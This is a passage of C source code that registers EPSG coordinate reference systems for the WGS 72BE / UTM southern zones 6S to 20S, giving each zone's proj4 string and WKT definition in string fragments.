\",PARAMETER[\\\"central_meridian\\\",-147],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32506\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32507, \"epsg\", 32507,\n        \"WGS 72BE / UTM zone 7S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=7 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 7S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-141],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32507\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32508, \"epsg\", 32508,\n        \"WGS 72BE / UTM zone 8S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=8 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 8S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-135],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32508\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32509, \"epsg\", 32509,\n        \"WGS 72BE / UTM zone 9S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=9 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 9S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-129],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32509\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32510, \"epsg\", 32510,\n        \"WGS 72BE / UTM zone 10S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=10 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 10S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-123],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32510\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32511, \"epsg\", 32511,\n        \"WGS 72BE / UTM zone 11S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=11 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 11S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-117],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32511\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32512, \"epsg\", 32512,\n        \"WGS 72BE / UTM zone 12S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=12 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 12S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-111],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32512\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32513, \"epsg\", 32513,\n        \"WGS 72BE / UTM zone 13S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=13 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 13S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-105],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32513\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32514, \"epsg\", 32514,\n        \"WGS 72BE / UTM zone 14S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=14 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 14S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-99],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32514\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32515, \"epsg\", 32515,\n        \"WGS 72BE / UTM zone 15S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=15 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 15S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-93],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32515\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32516, \"epsg\", 32516,\n        \"WGS 72BE / UTM zone 16S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=16 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 16S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-87],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32516\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32517, \"epsg\", 32517,\n        \"WGS 72BE / UTM zone 17S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=17 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 17S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-81],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32517\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32518, \"epsg\", 32518,\n        \"WGS 72BE / UTM zone 18S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=18 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 18S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-75],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32518\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32519, \"epsg\", 32519,\n        \"WGS 72BE / UTM zone 19S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=19 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 19S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-69],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUTH\");\n    add_srs_wkt (p, 11,\n        \"ORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32519\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32520, \"epsg\", 32520,\n        \"WGS 72BE / UTM zone 20S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=20 +south +ellps=WGS72 +towgs84=0,0,1.9,\");\n    add_proj4text (p, 1,\n        \"0,0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 20S\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    